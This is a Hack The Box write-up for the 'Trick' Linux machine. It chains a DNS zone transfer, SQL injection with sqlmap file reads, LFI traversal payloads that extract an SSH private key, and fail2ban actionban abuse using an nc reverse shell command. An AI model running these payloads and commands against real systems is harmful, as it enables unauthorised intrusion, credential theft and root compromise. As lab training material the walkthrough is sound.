---
title: HTB Trick
slug: trick
lang: en
platform: Hack The Box
category: Linux
headline: DNS zone transfer, SQL injection, LFI and fail2ban action abuse
difficulty: Easy
objective: root
date: 2025-11-09
tags: [Linux, DNS, SQL Injection, LFI, Fail2ban]
---

# HTB Trick

## Executive Summary

Trick starts with DNS and web enumeration. A zone transfer exposes a pre-production payroll subdomain where the login form is vulnerable to SQL injection. SQLMap confirms file read privileges, which are used to discover another virtual host. That host is vulnerable to LFI, allowing the extraction of Michael's SSH private key. Privilege escalation abuses writable control over the `fail2ban` action directory through the `security` group, replacing the ban action with a reverse shell payload.

## Enumeration and DNS

The target exposed SSH, SMTP, DNS and HTTP.

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.227.180 -oG allPorts
sudo nmap -p22,25,53,80 -sCV -oN Targeted 10.129.227.180
```

![[Pasted image 20260506113206.png|Initial port scan]]

Reverse DNS and zone transfer exposed additional names.

```bash
dig @10.129.227.180 -x 10.129.227.180
```

![[Pasted image 20260506113510.png|Reverse DNS lookup]]
![[Pasted image 20260506113546.png|Zone transfer]]

## SQL Injection

The `preprod-payroll.trick.htb` login form was vulnerable to SQL injection.

```text
admin' or 1=1-- -
```

![[Pasted image 20251108182730.png|preprod-payroll host]]
![[Pasted image 20251108183519.png|SQL injection payload]]
![[Pasted image 20251108183548.png|Basic SQL injection success]]

SQLMap confirmed the injection and FILE privilege.

```bash
sqlmap -u 'http://preprod-payroll.trick.htb/ajax.php?action=login' --data "username=123&password=123" -p username --level 5 --risk 3 --batch
sqlmap -u 'http://preprod-payroll.trick.htb/ajax.php?action=login' --data "username=123&password=123" -p username --level 5 --risk 3 --batch --privileges
```

![[Pasted image 20251109171716.png|Burp request capture]]
![[Pasted image 20251109172439.png|SQLMap injection validation]]
![[Pasted image 20260506113658.png|FILE privilege confirmed]]

The FILE privilege was used to read `/etc/passwd` and Nginx configuration.

```bash
sqlmap -u 'http://preprod-payroll.trick.htb/ajax.php?action=login' --data "username=123&password=123" -p username --level 5 --risk 3 --batch --file-read=/etc/passwd
sqlmap -u 'http://preprod-payroll.trick.htb/ajax.php?action=login' --data "username=123&password=123" -p username --level 5 --risk 3 --batch --file-read=/etc/nginx/sites-enabled/default
```

![[Pasted image 20260506113754.png|/etc/passwd read]]
![[Pasted image 20260506113850.png|Nginx config read]]
![[Pasted image 20251109175531.png|New vhost discovered]]

## LFI to SSH Key

The new virtual host was vulnerable to LFI through the `page` parameter.

```text
/index.php?page=....//....//....//....//....//etc/passwd
/index.php?page=....//....//....//....//....//home/michael/.ssh/id_rsa
```

![[Pasted image 20251109181040.png|LFI testing in Repeater]]
![[Pasted image 20251109181141.png|/etc/passwd through LFI]]
![[Pasted image 20251109182117.png|Michael private key through LFI]]

The recovered key allowed SSH access as `michael`.

```bash
ssh -i michael_id_rsa michael@10.129.13.100
```

![[Pasted image 20260506114000.png|SSH as michael]]

## fail2ban Privilege Escalation

Michael belonged to the `security` group. Files owned by that group led to `/etc/fail2ban/action.d`, where the directory was writable.

```bash
sudo -l
find / -group security 2>/dev/null | less
find / -group security -ls 2>/dev/null | less
```

![[Pasted image 20251109203019.png|sudo -l]]
![[Pasted image 20251109203327.png|michael group membership]]
![[Pasted image 20251109203511.png|Files owned by security group]]
![[Pasted image 20251109203732.png|Writable fail2ban context]]

The directory allowed replacing `iptables-multiport.conf` with a user-controlled copy.

```bash
mv iptables-multiport.conf iptables-multiport.conf.old
cp iptables-multiport.conf.old iptables-multiport.conf
```

![[Pasted image 20251109205810.png|actionban target line]]
![[Pasted image 20251109210142.png|User-owned iptables-multiport.conf]]

The `actionban` command was replaced with a reverse shell command.

```bash
/usr/bin/nc -e /bin/bash 10.10.16.47 4444
```

![[Pasted image 20251109210645.png|Reverse shell script]]
![[Pasted image 20251109212659.png|actionban modified]]
![[Pasted image 20251109211658.png|fail2ban service restart]]
![[Pasted image 20251109211917.png|Netcat listener and ban trigger]]
![[Pasted image 20260506114158.png|Working actionban payload]]

## Key Takeaways

- DNS zone transfers often expose hidden application surfaces.
- SQLi with FILE privilege can become filesystem discovery.
- LFI against user SSH keys is a direct initial access path.
- Writable directories can be enough to replace root-owned fail2ban action behavior.
